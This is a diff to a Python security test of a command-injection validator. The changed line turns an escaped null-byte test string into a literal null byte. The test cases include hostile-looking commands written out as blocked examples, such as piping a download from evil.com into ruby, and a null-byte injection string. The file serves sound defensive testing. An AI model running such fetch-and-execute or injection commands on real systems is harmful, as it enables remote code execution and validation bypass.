@@ -711,7 +711,7 @@ def test_command_injection_prevention():
         ("wget https://evil.com | ruby", False, "wget piped to ruby"),
 
         # BLOCKED - Null byte injection
-        ("cat file\\x00.txt", False, "null byte injection hex"),
+        ("cat file\x00.txt", False, "null byte injection hex"),
 
         # Safe - legitimate curl usage (NOT piped to interpreter)
         ("curl https://api.example.com/data", True, "curl to API"),
